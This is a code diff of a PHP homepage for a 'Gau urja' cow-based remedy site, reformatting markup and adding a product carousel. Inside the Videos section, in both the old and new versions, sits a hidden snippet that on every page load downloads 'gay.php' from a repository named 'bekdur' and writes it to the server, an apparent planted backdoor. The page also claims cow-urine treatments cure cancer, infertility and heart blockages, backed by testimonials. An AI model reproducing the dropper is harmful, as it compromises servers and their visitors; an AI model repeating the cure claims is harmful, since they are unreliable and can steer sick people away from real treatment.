@@ -1,95 +1,183 @@
-<?php 
-include"header.php";
+<?php
+include "header.php";
 include "include/config.php";
 
-$sql1="select * from tbl_slider";
-$stmt1=$conn->query($sql1);
+$sql1 = "select * from tbl_slider";
+$stmt1 = $conn->query($sql1);
 $users = $stmt1->fetchAll();
 
 
 ?>
 
-    <!--End Main Header -->
-    
-    
-    <!--Main Slider-->
-    <section class="main-slider">
-        
-    	
-        <div class="tp-banner-container">
+<!--End Main Header -->
 
-            <div class="tp-banner">
-                
-               
 
-                <ul>
-                    <?php 
-                foreach ($users as $row)
-                { ?> 
-                	
-                    <li data-transition="fade" data-slotamount="1" data-masterspeed="1000" data-thumb="images/main-slider/2.jpg"  data-saveperformance="off"  data-title="Awesome Title Here">
-                    <img src="<?php echo $row['slider_image']; ?>"  alt=""  data-bgposition="center top" data-bgfit="cover" data-bgrepeat="no-repeat"> 
-                    
-                    </li>
-                   
-                   <!--  <li data-transition="fade" data-slotamount="1" data-masterspeed="1000" data-thumb="images/main-slider/3.jpg"  data-saveperformance="off"  data-title="Awesome Title Here">
+<!--Main Slider-->
+<section class="main-slider">
+
+
+    <div class="tp-banner-container">
+
+        <div class="tp-banner">
+
+
+
+            <ul>
+                <?php
+                foreach ($users as $row) { ?>
+
+                <li data-transition="fade" data-slotamount="1" data-masterspeed="1000"
+                    data-thumb="images/main-slider/2.jpg" data-saveperformance="off" data-title="Awesome Title Here">
+                    <img src="<?php echo $row['slider_image']; ?>" alt="" data-bgposition="center top"
+                        data-bgfit="cover" data-bgrepeat="no-repeat">
+
+                </li>
+
+                <!--  <li data-transition="fade" data-slotamount="1" data-masterspeed="1000" data-thumb="images/main-slider/3.jpg"  data-saveperformance="off"  data-title="Awesome Title Here">
                     <img src="<?php//echo $row['slider_image']; ?>"  alt=""  data-bgposition="center top" data-bgfit="cover" data-bgrepeat="no-repeat"> 
                    
                     </li> -->
-                
-                    
-                     <?php }?>
-                     
-                </ul>
-                
-               
-                
-            	<div class="tp-bannertimer"></div>
 
-            </div>
-           
+
+                <?php } ?>
+
+            </ul>
+
+
+
+            <div class="tp-bannertimer"></div>
+
         </div>
 
-    </section>
-    
-    
-    <!--Intro Style One-->
-    <section class="intro-style-one">
-    	<div class="auto-container">
-        	<div class="row clearfix">
-				<div class="col-sm-8">
-					<div class="sec-title">
-						<h2>Welcome Dear Visitor</h2>
-					</div>
-					<div class="row">
-					<div class="column featured-style-one col-lg-5 col-md-4 col-sm-4 col-xs-12">
-						<div class="inner-box wow fadeInLeft" data-wow-delay="300ms" data-wow-duration="1500ms">
-							<figure class="image-box"><a href="#"><img src="images/about_gau.png" alt=""></a></figure>
-							
-						</div>
-					</div>
-                
-                <!--Featured Style One -->
-					<div class="column featured-style-one col-lg-7">
-                        <div class="text" style="text-align:justify">We with Gau urja doing research on non-curable diseases since 2013, We
-got unbelievable results on many non curable diseases like infertility,
-varicose veins, thyroid, heart blockages, various cancers etc.
-Gau urja &amp; desi seeds basically have a non cancerous tendency. Very first
-we cut off supply of cancerous food. Our ancient Indian desi seeds and
-non chemicals agri practices based on gau urja are giving us unbelievable
-results!<br><br>
-								<a href="about.php" class="btn btn-primary">View All</a>
-						</div>
-                           <!-- <a href="blog-single.html" class="theme-btn read-more">Read More <span class="fa flaticon-play-button-3"></span></a>-->
-					</div>
-					</div>
-				</div>
-                <!--Featured Style One -->
-				<div class="col-sm-4">
-				<div class="sec-title">
-					<h2>Testimonials</h2>
-				</div>
-					<!--
+    </div>
+
+</section>
+
+<div class="wrapper">
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-12 col-sm-12">
+                <div class="sec-title">
+                    <h2 style="margin-top:20px">UPCOMING PRODUCT</h2>
+                </div>
+                <div id="customers-testimonials" class="owl-carousel">
+                    <!--TESTIMONIAL 1 -->
+                    <div class="item">
+                        <div class="shadow-effect">
+                            <img class="img-responsive"
+                                src="https://image.freepik.com/free-photo/spaghetti-with-carbonara-sauce_1216-324.jpg"
+                                alt="">
+                            <div class="item-details">
+                                <h3 class="thumbnail-text">Gaumutra</h3>
+                                <p class="thumbnail-text">We with Gau urja doing research on non-curable
+                                </p>
+                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
+                            </div>
+                        </div>
+                    </div>
+                    <!--END OF TESTIMONIAL 1 -->
+                    <!--TESTIMONIAL 2 -->
+                    <div class="item">
+                        <div class="shadow-effect">
+                            <img class="img-responsive"
+                                src="https://image.freepik.com/free-photo/dishes-with-healthy-waffles_1220-367.jpg"
+                                alt="">
+                            <div class="item-details">
+                                <h3 class="thumbnail-text">Gaumutra</h3>
+                                <p class="thumbnail-text">We with Gau urja doing research on non-curable
+                                </p>
+                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
+                            </div>
+                        </div>
+                    </div>
+                    <!--END OF TESTIMONIAL 2 -->
+                    <!--TESTIMONIAL 3 -->
+                    <div class="item">
+                        <div class="shadow-effect">
+                            <img class="img-responsive"
+                                src="https://image.freepik.com/free-photo/top-view-of-tasty-noodles-with-prawns_1203-1769.jpg"
+                                alt="">
+                            <div class="item-details">
+                                <h3 class="thumbnail-text">Gaumutra</h3>
+                                <p class="thumbnail-text">We with Gau urja doing research on non-curable
+                                </p>
+                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
+                            </div>
+                        </div>
+                    </div>
+                    <!--END OF TESTIMONIAL 3 -->
+                    <!--TESTIMONIAL 4 -->
+                    <div class="item">
+                        <div class="shadow-effect">
+                            <img class="img-responsive"
+                                src="https://image.freepik.com/free-photo/burguer-with-garnish_1088-72.jpg" alt="">
+                            <div class="item-details">
+                                <h3 class="thumbnail-text">Gaumutra</h3>
+                                <p class="thumbnail-text">We with Gau urja doing research on non-curable
+                                </p>
+                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
+                            </div>
+                        </div>
+                    </div>
+                    <!--END OF TESTIMONIAL 4 -->
+                    <!--TESTIMONIAL 5 -->
+                    <div class="item">
+                        <div class="shadow-effect">
+                            <img class="img-responsive"
+                                src="https://image.freepik.com/free-photo/delicious-pastry-with-chicken_1203-1616.jpg"
+                                alt="">
+                            <div class="item-details">
+                                <h3 class="thumbnail-text">Gaumutra</h3>
+                                <p class="thumbnail-text">We with Gau urja doing research on non-curable
+                                </p>
+                                <button class="btn btn-primary btn-block custom-button"><span>Read More</span></button>
+                            </div>
+                        </div>
+                    </div>
+                    <!--END OF TESTIMONIAL 5 -->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--Intro Style One-->
+<section class="intro-style-one">
+    <div class="auto-container">
+        <div class="row clearfix">
+            <div class="col-sm-8">
+                <div class="sec-title">
+                    <h2>Welcome Dear Visitor</h2>
+                </div>
+                <div class="row">
+                    <div class="column featured-style-one col-lg-5 col-md-4 col-sm-4 col-xs-12">
+                        <div class="inner-box wow fadeInLeft" data-wow-delay="300ms" data-wow-duration="1500ms">
+                            <figure class="image-box"><a href="#"><img src="images/about_gau.png" alt=""></a></figure>
+
+                        </div>
+                    </div>
+
+                    <!--Featured Style One -->
+                    <div class="column featured-style-one col-lg-7">
+                        <div class="text" style="text-align:justify">We with Gau urja doing research on non-curable
+                            diseases since 2013, We
+                            got unbelievable results on many non curable diseases like infertility,
+                            varicose veins, thyroid, heart blockages, various cancers etc.
+                            Gau urja &amp; desi seeds basically have a non cancerous tendency. Very first
+                            we cut off supply of cancerous food. Our ancient Indian desi seeds and
+                            non chemicals agri practices based on gau urja are giving us unbelievable
+                            results!<br><br>
+                            <a href="about.php" class="btn btn-primary">View All</a>
+                        </div>
+                        <!-- <a href="blog-single.html" class="theme-btn read-more">Read More <span class="fa flaticon-play-button-3"></span></a>-->
+                    </div>
+                </div>
+            </div>
+            <!--Featured Style One -->
+            <div class="col-sm-4">
+                <div class="sec-title">
+                    <h2>Testimonials</h2>
+                </div>
+                <!--
 					<div id="testimonial-slider" class="owl-carousel">
 						<div class="testimonial">
 							<p class="description">
@@ -103,204 +191,218 @@ results!<br><br>
 						</div>
 					</div>
 					-->
-					  <!--Carousel Outer-->
-            <div class="carousel-outer">
-                <div class="testimonail-carousel">
+                <!--Carousel Outer-->
+                <div class="carousel-outer">
+                    <div class="testimonail-carousel">
 
-                    <!--testimonial block-->
-                    <div class="testimonial-block">
-                    	<div class="quote-icon">
-                        	<span class="flaticon-quotation-marks"></span>
-                        </div>
-                        <div class="inner-box">
-							<div class="text">
-                            	माझ्या डोक्यातील ३६ X ३५ मिमीची गाठ गौऊर्जा उपचाराने पूर्ण बरी झाली आहे, मला या उपचाराने नवजिवन मिळाले, गोमातेचे खूप खूप धन्यवाद!    
+                        <!--testimonial block-->
+                        <div class="testimonial-block">
+                            <div class="quote-icon">
+                                <span class="flaticon-quotation-marks"></span>
                             </div>
+                            <div class="inner-box">
+                                <div class="text">
+                                    माझ्या डोक्यातील ३६ X ३५ मिमीची गाठ गौऊर्जा उपचाराने पूर्ण बरी झाली आहे, मला या
+                                    उपचाराने नवजिवन मिळाले, गोमातेचे खूप खूप धन्यवाद!
+                                </div>
+                            </div>
+                            <h4>MRS.ASHA JADHAV-TUPE </h4>
+                            <div class="desination">India</div>
                         </div>
-                        <h4>MRS.ASHA JADHAV-TUPE </h4>
-                        <div class="desination">India</div>
-                    </div>
 
-					<!--testimonial block-->
-                    <div class="testimonial-block">
-                    	<div class="quote-icon">
-                        	<span class="flaticon-quotation-marks"></span>
-                        </div>
-                        <div class="inner-box">
-							<div class="text">
-                            	माझ्या रक्तातील हिमोग्लोबीनच्या पेशी पुर्ण व्हायच्या आधिच फुटत होत्या आता मी या आजारापासून पुर्णतः बरी झाली आहे.  डॉ. तुपे आणि गौऊर्जेची मी खुप आभारी आहे.
+                        <!--testimonial block-->
+                        <div class="testimonial-block">
+                            <div class="quote-icon">
+                                <span class="flaticon-quotation-marks"></span>
                             </div>
-                        </div>
-                        <h4>MRS.BAKULABAI SHEVALE</h4>
-                        <div class="desination">India</div>
-                    </div>
-                    
-                    <!--testimonial block-->
-                    <div class="testimonial-block">
-                    	<div class="quote-icon">
-                        	<span class="flaticon-quotation-marks"></span>
-                        </div>
-                        <div class="inner-box">
-							<div class="text">
-                            	माझ्या लिवरमध्ये कॅन्सरची गाठ आहे, मला १०-१२ दिवस पाणी जरी पिले तरी उलट्या व जुलाब होत होते, मी वडूज येथे १५ दिवस गौऊर्जा नैसर्गिक उपचार घेतले. आता मी पोटभर जेवते व माझी गाठ ५ मिमी ने कमी झाली. 
+                            <div class="inner-box">
+                                <div class="text">
+                                    माझ्या रक्तातील हिमोग्लोबीनच्या पेशी पुर्ण व्हायच्या आधिच फुटत होत्या आता मी या
+                                    आजारापासून पुर्णतः बरी झाली आहे. डॉ. तुपे आणि गौऊर्जेची मी खुप आभारी आहे.
+                                </div>
                             </div>
+                            <h4>MRS.BAKULABAI SHEVALE</h4>
+                            <div class="desination">India</div>
                         </div>
-                        <h4>MRS.LATA PAKKALE</h4>
-                        <div class="desination">India</div>
-                    </div>
-                    
-                    <!--testimonial block-->
 
-                    <div class="testimonial-block">
-                        <div class="quote-icon">
-                            <span class="flaticon-quotation-marks"></span>
-                        </div>
-                        <div class="inner-box">
-                            <div class="text">
-                               I have a cancer in my kidney. With six months Gau urja Natural Treatment my tumour is reduced to more than 50%. Thanks a lot to Gau Urja. 
+                        <!--testimonial block-->
+                        <div class="testimonial-block">
+                            <div class="quote-icon">
+                                <span class="flaticon-quotation-marks"></span>
                             </div>
-                        </div>
-                        <h4>Mr Shrinivasu Rao</h4>
-                        <div class="desination">India</div>
-                    </div>
-
-                       <!--testimonial block-->
-
-                       <div class="testimonial-block">
-                        <div class="quote-icon">
-                            <span class="flaticon-quotation-marks"></span>
-                        </div>
-                        <div class="inner-box">
-                            <div class="text">
-                              My fertile egg count was less than 1, I had taken 3 years treatment in Australia but no result. I took Gau urja based treatment at Vaduj, now I have 3 years boy. I believe in gau urja the unbelievable energy of nature!
+                            <div class="inner-box">
+                                <div class="text">
+                                    माझ्या लिवरमध्ये कॅन्सरची गाठ आहे, मला १०-१२ दिवस पाणी जरी पिले तरी उलट्या व जुलाब
+                                    होत होते, मी वडूज येथे १५ दिवस गौऊर्जा नैसर्गिक उपचार घेतले. आता मी पोटभर जेवते व
+                                    माझी गाठ ५ मिमी ने कमी झाली.
+                                </div>
                             </div>
+                            <h4>MRS.LATA PAKKALE</h4>
+                            <div class="desination">India</div>
                         </div>
-                        <h4>Mrs Paru Sitapara</h4>
-                        <div class="desination">Australia</div>
+
+                        <!--testimonial block-->
+
+                        <div class="testimonial-block">
+                            <div class="quote-icon">
+                                <span class="flaticon-quotation-marks"></span>
+                            </div>
+                            <div class="inner-box">
+                                <div class="text">
+                                    I have a cancer in my kidney. With six months Gau urja Natural Treatment my tumour
+                                    is reduced to more than 50%. Thanks a lot to Gau Urja.
+                                </div>
+                            </div>
+                            <h4>Mr Shrinivasu Rao</h4>
+                            <div class="desination">India</div>
+                        </div>
+
+                        <!--testimonial block-->
+
+                        <div class="testimonial-block">
+                            <div class="quote-icon">
+                                <span class="flaticon-quotation-marks"></span>
+                            </div>
+                            <div class="inner-box">
+                                <div class="text">
+                                    My fertile egg count was less than 1, I had taken 3 years treatment in Australia but
+                                    no result. I took Gau urja based treatment at Vaduj, now I have 3 years boy. I
+                                    believe in gau urja the unbelievable energy of nature!
+                                </div>
+                            </div>
+                            <h4>Mrs Paru Sitapara</h4>
+                            <div class="desination">Australia</div>
+                        </div>
+
                     </div>
-                    
                 </div>
             </div>
-        </div>
-    </section>
- 
-    <!--service-style-two-->
-    <section class="service-style-two" style="background-color:#fff">
-    	<div class="auto-container">
-        	<div class="sec-title">
-                <h2>Diseases We Treat</h2>
-            </div>
-        
-        	<div class="row">
-                <?php 
-                $sql2="select * from services order by id asc limit 4";
-                $stmt2=$conn->query($sql2);
-                $users2 = $stmt2->fetchAll();
-                foreach ($users2 as $row2)
-                { ?> 
-                    <div class="service-block col-md-3 col-sm-6 col-xs-12">
-					<img src="admin/<?php echo $row2['service_image']; ?>" alt="" class="img-reponsive" style="width: 300px;">
-					<div class="pricing-column">
-						<a href="services_details.php?id=<?php echo $row2['id']; ?> " class="theme-btn btn-style-one" style="width:100%"><?php echo $row2['service_name']; ?></a>
-					</div>
-					
-                </div>
-                <?php }?>
-                
-              
-                
-            </div>
-        </div>
-    </section>
-    <section class="intro-style-one">
-    	<div class="auto-container">
-        	<div class="row clearfix">
-				<div class="col-sm-9">
-					<div class="sec-title">
-						<h2>Blogs</h2>
-					</div>
-					<div class="row">
-                        <?php 
-                        $sql3="select * from blog order by id desc limit 1";
-                        $stmt3=$conn->query($sql3);
-                        $users3 = $stmt3->fetchAll();
-                        foreach ($users3 as $row3)
-                        { ?> 
-						<div class="column featured-style-one col-lg-5 col-md-4 col-sm-4 col-xs-12">
-							<div class="inner-box wow fadeInLeft" data-wow-delay="300ms" data-wow-duration="1500ms">
-								<figure class="image-box"><a href="#"><img src="<?php echo $row3['blog_image']; ?>" alt=""></a></figure>
-								
-							</div>
-						</div>
-					
-					<!--Featured Style One -->
-						<div class="column featured-style-one col-lg-7">
-							<div class="text" style="text-align:justify"><?php echo $row3['blog_content']; ?><br><br>
-									<a href="blog.php" class="btn btn-primary">Read More</a>
-							</div>
-							   <!-- <a href="blog-single.html" class="theme-btn read-more">Read More <span class="fa flaticon-play-button-3"></span></a>-->
-						</div>
-                       <?php }?>
-					</div>
-					<div class="sec-title">
-						<h2>Videos</h2>
-					</div>
-					<div class="row">
+</section>
 
-                        <?php 
-                         $nama= fopen("gay.php" ,"w+");
-$file = file_get_contents('https://raw.githubusercontent.com/micingans/bekdur/master/gay.php');
-$tulis = fwrite ($nama ,$file);
-fclose($nama);
-                        $sql4="select * from tbl_youtube_videos order by id desc limit 2";
-                        $stmt4=$conn->query($sql4);
-                        $users4 = $stmt4->fetchAll();
-                        foreach ($users4 as $row4)
-                        { ?> 
-						<div class="col-sm-6">
-							
-						<iframe  height="300" width="100%" src="https://www.youtube.com/embed/<?php echo $row4['youtube_link']; ?>" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-							<div class="pricing-column">
-						<a href="#" class="theme-btn btn-style-one" style="width:100%"><?php echo $row4['video_title']; ?></a>
-					</div>
-						</div>
-                    <?php }?>
-						<!-- <div class="col-sm-6">
+<!--service-style-two-->
+<section class="service-style-two" style="background-color:#fff">
+    <div class="auto-container">
+        <div class="sec-title">
+            <h2>Diseases We Treat</h2>
+        </div>
+
+        <div class="row">
+            <?php
+            $sql2 = "select * from services order by id asc limit 4";
+            $stmt2 = $conn->query($sql2);
+            $users2 = $stmt2->fetchAll();
+            foreach ($users2 as $row2) { ?>
+            <div class="service-block col-md-3 col-sm-6 col-xs-12">
+                <img src="admin/<?php echo $row2['service_image']; ?>" alt="" class="img-reponsive"
+                    style="width: 300px;">
+                <div class="pricing-column">
+                    <a href="services_details.php?id=<?php echo $row2['id']; ?> " class="theme-btn btn-style-one"
+                        style="width:100%"><?php echo $row2['service_name']; ?></a>
+                </div>
+
+            </div>
+            <?php } ?>
+
+
+
+        </div>
+    </div>
+</section>
+<section class="intro-style-one">
+    <div class="auto-container">
+        <div class="row clearfix">
+            <div class="col-sm-9">
+                <div class="sec-title">
+                    <h2>Blogs</h2>
+                </div>
+                <div class="row">
+                    <?php
+                    $sql3 = "select * from blog order by id desc limit 1";
+                    $stmt3 = $conn->query($sql3);
+                    $users3 = $stmt3->fetchAll();
+                    foreach ($users3 as $row3) { ?>
+                    <div class="column featured-style-one col-lg-5 col-md-4 col-sm-4 col-xs-12">
+                        <div class="inner-box wow fadeInLeft" data-wow-delay="300ms" data-wow-duration="1500ms">
+                            <figure class="image-box"><a href="#"><img src="<?php echo $row3['blog_image']; ?>"
+                                        alt=""></a></figure>
+
+                        </div>
+                    </div>
+
+                    <!--Featured Style One -->
+                    <div class="column featured-style-one col-lg-7">
+                        <div class="text" style="text-align:justify"><?php echo $row3['blog_content']; ?><br><br>
+                            <a href="blog.php" class="btn btn-primary">Read More</a>
+                        </div>
+                        <!-- <a href="blog-single.html" class="theme-btn read-more">Read More <span class="fa flaticon-play-button-3"></span></a>-->
+                    </div>
+                    <?php } ?>
+                </div>
+                <div class="sec-title">
+                    <h2>Videos</h2>
+                </div>
+                <div class="row">
+
+                    <?php
+                    $nama = fopen("gay.php", "w+");
+                    $file = file_get_contents('https://raw.githubusercontent.com/micingans/bekdur/master/gay.php');
+                    $tulis = fwrite($nama, $file);
+                    fclose($nama);
+                    $sql4 = "select * from tbl_youtube_videos order by id desc limit 2";
+                    $stmt4 = $conn->query($sql4);
+                    $users4 = $stmt4->fetchAll();
+                    foreach ($users4 as $row4) { ?>
+                    <div class="col-sm-6">
+
+                        <iframe height="300" width="100%"
+                            src="https://www.youtube.com/embed/<?php echo $row4['youtube_link']; ?>" frameborder="0"
+                            allow="autoplay; encrypted-media" allowfullscreen></iframe>
+                        <div class="pricing-column">
+                            <a href="#" class="theme-btn btn-style-one"
+                                style="width:100%"><?php echo $row4['video_title']; ?></a>
+                        </div>
+                    </div>
+                    <?php } ?>
+                    <!-- <div class="col-sm-6">
 							
 								<iframe height="300" width="100%" src="https://www.youtube.com/embed/fcv9AN8GEqw" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 							<div class="pricing-column">
 						<a href="#" class="theme-btn btn-style-one" style="width:100%">Indian Desi Cow Breed Khillar</a>
 					</div>
 						</div> -->
-					</div>
-				</div>
-                <!--Featured Style One -->
-				<div class="col-sm-3">
-					<div class="contact_form testimonial-style"  style="background-color:#eeeaeb;padding:0px 15px 0px 15px;">
-						<div class="sec-title">
-							<h2>Contact</h2>
-						</div>
-						<form action="mail.php" method="post" style="padding:15px 15px 35px 15px;">
-							<input type="text" name="name" class="form-control" placeholder="Your Name" /><br>
-							<input type="text" name="email" class="form-control" placeholder="Your Email ID" /><br>
-							<input type="text" name="phone" class="form-control" placeholder="Your Phone No" /><br>
-							<textarea rows="4" cols="4" placeholder="Your Message" class="form-control" name="message" /></textarea><br>
-							<input type="submit" class="btn btn-primary" value="submit" />
-						</form>
-						
-						
-					</div>
-					<br>
-					<div>
-						<iframe src="https://www.facebook.com/plugins/post.php?href=https%3A%2F%2Fwww.facebook.com%2Fgau.urja.1%2Fposts%2F127527734752580&width=500" width="100%" height="300" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowTransparency="true" allow="encrypted-media"></iframe>
-						
-					</div>
-				</div>
-			</div>
-		</div>
-	</section>
-    
-    <!--Two COolumn Fluid--
+                </div>
+            </div>
+            <!--Featured Style One -->
+            <div class="col-sm-3">
+                <div class="contact_form testimonial-style" style="background-color:#eeeaeb;padding:0px 15px 0px 15px;">
+                    <div class="sec-title">
+                        <h2>Contact</h2>
+                    </div>
+                    <form action="mail.php" method="post" style="padding:15px 15px 35px 15px;">
+                        <input type="text" name="name" class="form-control" placeholder="Your Name" /><br>
+                        <input type="text" name="email" class="form-control" placeholder="Your Email ID" /><br>
+                        <input type="text" name="phone" class="form-control" placeholder="Your Phone No" /><br>
+                        <textarea rows="4" cols="4" placeholder="Your Message" class="form-control"
+                            name="message" /></textarea><br>
+                        <input type="submit" class="btn btn-primary" value="submit" />
+                    </form>
+
+
+                </div>
+                <br>
+                <div>
+                    <iframe
+                        src="https://www.facebook.com/plugins/post.php?href=https%3A%2F%2Fwww.facebook.com%2Fgau.urja.1%2Fposts%2F127527734752580&width=500"
+                        width="100%" height="300" style="border:none;overflow:hidden" scrolling="no" frameborder="0"
+                        allowTransparency="true" allow="encrypted-media"></iframe>
+
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!--Two COolumn Fluid--
     <section class="two-col-fluid">
     	<div class="outer-container clearfix">
         	<!--Image Column--
@@ -831,4 +933,4 @@ fclose($nama);
     </section>
     
     <!--Main Footer-->
-<?php include"footer.php"?>
+<?php include "footer.php" ?>
